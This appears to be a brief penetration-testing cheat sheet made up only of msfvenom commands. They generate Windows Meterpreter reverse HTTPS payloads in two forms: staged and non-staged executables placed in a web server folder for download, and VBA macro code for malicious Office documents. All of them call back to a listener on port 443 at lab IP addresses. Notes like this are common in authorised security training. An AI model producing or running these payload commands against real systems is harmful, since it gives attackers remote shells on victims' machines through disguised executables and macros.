## Msfvenom Payloads
Staged & Non-staged payloads

```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfnonstaged.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
```
Macro - VBA 
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 EXITFUNC=thread -f vbapplication
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 EXITFUNC=thread -f vba
```

